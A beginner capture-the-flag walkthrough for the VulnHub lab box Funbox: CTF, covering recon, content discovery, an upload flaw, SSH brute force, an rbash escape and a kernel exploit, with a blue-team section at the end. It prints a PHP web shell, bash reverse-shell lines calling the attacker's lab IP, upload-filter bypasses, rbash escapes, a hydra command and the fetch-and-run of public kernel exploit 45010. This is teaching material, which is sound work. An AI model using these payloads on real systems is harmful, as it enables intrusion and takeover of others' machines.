# Funbox: CTF — VulnHub Walkthrough (Beginner Friendly)

> Also known as **Funbox 4**. The author (0815R2d2) subtitles it *"Groundhog
> Day: Boot2Root"* and says *"initial footstep is a bit flowed, but really not
> difficult."* The whole box is built around two hints: **`Nikto scans 'case
> sensitive'`** and **`you need a minimum of 15 mins to get user`**. Every step is
> explained.

| Field | Value |
| --- | --- |
| **Machine** | Funbox: CTF |
| **Difficulty** | Easy *(some community indexes rate this one "Medium")* |
| **Author** | 0815R2d2 |
| **Released** | 5 September 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/funbox-ctf,546/ |
| **Download** | https://vulnhub.com/entry/funbox-ctf,546/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu) |

> **Important:** the box calls itself **`funbox4`**. Add it to `/etc/hosts`
> before browsing so the site behaves the way the author intended.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to discover a host and scan its ports.
- Why web content discovery tools **miss uppercase files** — and how to fix that
  (`dirsearch --uppercase`, or just asking for `/ROBOTS.TXT` directly).
- How a hidden directory pointed to by `robots.txt` can hide an **upload form**.
- How an unrestricted file upload becomes **remote code execution**.
- How to build a *targeted* wordlist from a hint and brute-force SSH with
  `hydra` (the "15 minutes" in the box description is a clue about this step).
- How an **outdated Linux kernel** (CVE-2017-16995) gives local root.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Kali running, OVA imported, both VMs on
the same host-only network.

---

## 1. Reconnaissance — finding the target

> **Goal:** confirm the target's IP address on your isolated lab network.

```bash
# What is my attacker IP and subnet?
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# List live hosts with ARP (fast, works even if the host blocks ping)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (Kali)
192.168.56.101  08:00:27:11:22:33   PCS Systemtechnik GmbH   (target)
```

**Target IP:** `192.168.56.101`

![arp-scan finding the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
# Full TCP sweep first, then version detection on the open ports
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80,110,143 -oA scans/services 192.168.56.101
```

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:** we have a web server (`:80`) and three mail services
> (`:110`, `:143`). The web server is the most promising. The `-A` flag on a
> full scan also reveals the machine's **hostname, `funbox4`**.

### 2.1 Fix the hostname

```bash
sudo -e /etc/hosts
```

Add this line (keep any existing lines):

```text
192.168.56.101  funbox4
```

> **Why it works:** `/etc/hosts` resolves `funbox4` to the target without DNS.
> Virtual-hosted sites often serve different content depending on the requested
> hostname, and the author built the box assuming you browse by name.

### 2.2 A boring default page (the "flowed" first step)

Browsing `http://funbox4/` shows the **Apache2 Ubuntu Default Page**. There is
nothing interesting in the HTML, so we have to *find* the hidden content.


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
# Common wordlists miss the title-case / uppercase files on this box
gobuster dir -u http://funbox4/ -w /usr/share/wordlists/dirb/common.txt -t 40
```

```text
# ... nothing useful ...
```

```bash
# dirsearch can also try UPPERCASE names - the box hint says "case sensitive"
dirsearch -u http://funbox4/ -w /usr/share/wordlists/dirb/common.txt -t 40 --uppercase
```

```text
[12:00:01] 200 -   16B  - /ROBOTS.TXT
[12:00:01] 301 -  316B  - /upload/
```

> **Why it works:** Linux is case-sensitive, but most wordlists are lowercase.
> A file literally named `ROBOTS.TXT` is invisible to `gobuster` yet obvious to a
> scanner that tries case variations. This is exactly the box's first hint:
> *"Nikto scans 'case sensitive'."*

![nmap scan and robots.txt discovery](images/02-nmap.png)

### 2.3 The hidden hint

```bash
curl http://funbox4/ROBOTS.TXT
```

```text
User-agent: *
Disallow: igmseklhgmrjmtherij2145236
```

> **How to read it:** `robots.txt` tells crawlers what *not* to index. Attackers
> read it as a **list of interesting things to index**. Here it exposes a random
> directory name.

```bash
# Enumerate the "hidden" directory the robots file pointed us to
dirsearch -u http://funbox4/igmseklhgmrjmtherij2145236/ -t 40 -x php,html
```


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)

```text
[12:10:01] 200 -  ... - /igmseklhgmrjmtherij2145236/upload.html
[12:10:01] 200 -  ... - /igmseklhgmrjmtherij2145236/upload.php
```

(Exact directory/file names vary a little between builds — follow whatever your
scanner finds.)

---

## 3. Foothold — gaining the first shell

### 3.1 The vulnerability: an unrestricted file upload

`upload.html` is a simple **file upload form**. The handler lets us upload a
`.php` file, and Apache then *executes* it. That is **arbitrary code execution by
design**.

Create a tiny web shell:

```bash
printf '%s\n' '<?php echo "Shell"; system($_GET['"'"'cmd'"'"']); ?>' > shell.php
cat shell.php
```

```text
<?php echo "Shell"; system($_GET['cmd']); ?>
```

> **Why it works:** `system()` runs whatever command we pass in the `cmd` query
> parameter, as the user Apache runs as.

Upload `shell.php` through the form, then confirm execution:

```bash
curl "http://funbox4/igmseklhgmrjmtherij2145236/upload/shell.php?cmd=whoami"
```

```text
www-data
```

> **Why it works:** the response contains the output of `whoami`, proving our PHP
> is executing server-side as `www-data`.

### 3.2 Upgrade to a reverse shell

A web shell is fine for one-off commands; a reverse shell is easier to work in.


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# On Kali: start a listener
nc -lvnp 4444
```

Ask the web shell to connect back:

```bash
curl "http://funbox4/igmseklhgmrjmtherij2145236/upload/shell.php?cmd=bash+-i+>%26+/dev/tcp/192.168.56.10/4444+0>%261"
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 48912
www-data@funbox4:/var/www/html/igmseklhgmrjmtherij2145236/upload$
```

We now have a shell as `www-data`. Upgrade it to a full TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then on Kali: stty raw -echo; fg
```

![unrestricted file upload to reverse shell](images/03-foothold.png)

### 3.3 The other hint — a password note

While enumerating `/home`, we find a home directory for a user named `thomas`
containing a hidden note:

```bash
ls -la /home
cat /home/thomas/.todo 2>/dev/null
```

```text
# ... something like: the user password ends with "!"
```

> **Why it works:** the author hid the *second* hint here. It tells us the shape
> of the password we need, which lets us build a **targeted** wordlist instead of
> brute-forcing blindly.

There is no readable user flag in the web root — the "user" step on this box is
**logging in as `thomas`**, which we do in the next section.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

### 4.1 Step 1 — get a real user account (SSH brute force)

The description promises *"a minimum of 15 mins to get user"*. The hint file says
the password ends with `!`, so we append `!` to every line of `rockyou.txt`:


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
# Build the targeted wordlist (this is the part that "joyfully" takes time)
sed 's/$/!/' /usr/share/wordlists/rockyou.txt > /tmp/rockyou-bang.txt

hydra -l thomas -P /tmp/rockyou-bang.txt ssh://192.168.56.101
```

```text
[22][ssh] host: 192.168.56.101   login: thomas   password: thebest!
```

> **Why it works:** the hint narrows a ~14-million-word list down to a far more
> likely candidate set. `thomas`'s password is a dictionary word with `!`
> appended. *(The exact password varies by build — use whatever `hydra` finds.)*


> ### 📖 Concept — Escaping a restricted shell
>
> **`rbash`** (restricted bash) is bash started with `--restricted`. It blocks:
> changing directory (`cd`), setting or unsetting `SHELL`/`PATH`/`ENV`/`BASH_ENV`,
> command names containing `/`, output redirection with `>`, and `exec`/`source` of
> absolute paths.
>
> It is a *shell* restriction, not a security boundary — it only constrains that one
> process. **Anything that spawns a fresh shell escapes it.** Work through these:
>
> ```bash
> # 1. Does any permitted command spawn a shell?
> vim -c ':!sh'            # or :set shell=/bin/bash  then :shell
> less /etc/passwd         # then type !sh
> more, man (then !sh), ftp (!/bin/sh), gdb (-ex '!sh'), awk ('BEGIN{system("/bin/sh")}')
> find . -exec /bin/sh \; -quit
>
> # 2. Can you run an interpreter at all?
> python -c 'import os; os.system("/bin/sh")'
> perl -e 'exec "/bin/sh";'
> php -r "system('/bin/sh');"
>
> # 3. Is SSH available with a command override?
> ssh user@target -t "/bin/sh"          # -t forces a tty, bypassing the login shell
> ssh user@target -t "bash --noprofile --norc"
>
> # 4. Is the restriction only in the profile?
> bash --noprofile --norc               # a clean, unrestricted bash
> export SHELL=/bin/bash                # if you can reach env at all
>
> # 5. Can you write a file and execute it another way?
> echo '/bin/sh' > /tmp/x.sh            # redirection is often blocked — try tee
> ```
>
> **Check what you actually have first.** `echo $0` shows the shell; `set -o` lists
> options (look for `restricted on`); `echo $PATH` shows whether it is pinned;
> `compgen -c | head -50` lists runnable commands.
>
> **The general principle:** a restricted shell limits *one process*. Find any child
> process it lets you create, and the restriction does not apply there.
>
> **Deep dive:** [CONCEPTS §12 — Shells](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
ssh thomas@192.168.56.101
# password: thebest!   (rbash: a restricted shell)
```

The shell is **restricted (`rbash`)** — `cd`, `/`, and many commands are blocked.
Escape it by launching an unrestricted shell:

```bash
ssh thomas@192.168.56.101 -t "bash --noprofile"
```

> **Why it works:** `-t` forces a TTY and `bash --noprofile` starts a normal
> shell, bypassing the restricted one set in `thomas`'s account.

### 4.2 Step 2 — kernel exploit to root

```bash
uname -a
cat /etc/os-release
```

```text
Linux funbox4 4.4.0-21-generic #37-Ubuntu SMP ... x86_64 GNU/Linux
```

> **How to read it:** kernel **4.4.0-21** is vulnerable to
> **CVE-2017-16995** — a flaw in the BPF verifier that allows local users to
> escalate to root. It is public as **Exploit-DB 45010**.


> ### 📖 Concept — Kernel exploits: how to match one, and why to use them last
>
> ```bash
> uname -a; cat /proc/version; cat /etc/os-release
> searchsploit linux kernel $(uname -r | cut -d- -f1)
> ```
>
> Cross-reference the version at <https://www.linuxkernelcves.com/> and
> <https://github.com/SecWiki/linux-kernel-exploits>. Frequent favourites:
>
> | Exploit | Kernel | Mechanism |
> | --- | --- | --- |
> | **Dirty COW** (CVE-2016-5195) | < 4.8.3 | Race in copy-on-write → write any file |
> | **Overlayfs** (CVE-2015-1328) | Ubuntu 3.13–3.19 | Namespace + setuid → root |
> | **PwnKit** (CVE-2021-4034) | polkit < 0.120 | `pkexec` memory corruption |
> | **Baron Samedit** (CVE-2021-3156) | sudo < 1.9.5p2 | `sudoedit` heap overflow |
> | **Dirty Pipe** (CVE-2022-0847) | 5.8 – 5.16.11 | Page-cache write → overwrite any file |
>
> **Match the architecture too.** A 32-bit target (`i686` in `uname -a`) needs the
> 32-bit build; a mismatched exploit fails with a confusing error. Compile with the
> flags the author specifies — Dirty COW's `40847.cpp` needs
> `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`.
>
> > ⚠️ **Use kernel exploits last.** They can panic the VM, corrupt the filesystem
> > and cost you a full re-import. If a clean misconfiguration path exists — `sudo`,
> > SUID, capabilities, cron, a writable file — take it. Kernel exploitation is the
> > fallback when the administrator got everything else right.
>
> **Read the exploit before running it.** Many public entries are unverified and some
> are hostile to whoever runs them. `searchsploit -x <id>` and understand it.
>
> **Deep dive:** [CONCEPTS §15.7 — Kernel exploits](../../docs/CONCEPTS.md#157-kernel-exploits)
> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit "Linux Kernel 4.4" | grep 45010
```

```text
Linux Kernel 4.4.0 (Ubuntu 16.04 / 16.10) - 'BPF' Local Privilege Escalation | linux/local/45010.c
```

Copy `45010.c` to the target and compile it there:

```bash
# On Kali
python3 -m http.server 8000            # serve the exploit
# On the target (thomas)
wget http://192.168.56.10:8000/45010.c
gcc 45010.c -o exploit                 # the file header shows the build command
./exploit
```

```text
[+] Success
root@funbox4:/home/thomas#
```

> **Why it works:** the exploit abuses the vulnerable BPF JIT/verifier to run a
> payload with `root` privileges.

### The root flag

```bash
id
cat /root/flag.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
# ... the root flag; name/path varies by build
```

![kernel exploit to root](images/04-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Hidden content in `robots.txt` | HTTP `/ROBOTS.TXT` | Directory discovery |
| 2 | Unrestricted file upload (`.php`) | `upload.php` | Remote Code Execution as `www-data` |
| 3 | Weak/guessable SSH password + hint leak | `/home/thomas/.todo` | SSH access as `thomas` |
| 4 | Outdated kernel (CVE-2017-16995) | Linux 4.4.0-21 | Local Privilege Escalation to `root` |
| 5 | Restricted shell treated as security | `rbash` | Trivial bypass with `bash --noprofile` |

## 6. Defensive lessons (blue team)

- **Never upload to a web-executable directory.** Store uploads outside the web
  root, rename them, and validate type/size. Even better: don't allow uploads at
  all unless required.
- **Don't leak secrets in `robots.txt`.** It is *published*, not hidden. Use it
  only to disallow crawling, never to reference "hidden" directories.
- **Enforce strong password policy.** Dictionary words with a trailing `!` are
  trivially generated. Enforce length and add MFA or key-based SSH.
- **Patch the kernel.** Track your distribution's security advisories; 4.4.x is
  long end-of-life.
- **`rbash` is not a security boundary.** Do not rely on it to contain a user;
  use real sandboxing/permissions.
- **Detection:** alert on successful file uploads that are then requested and
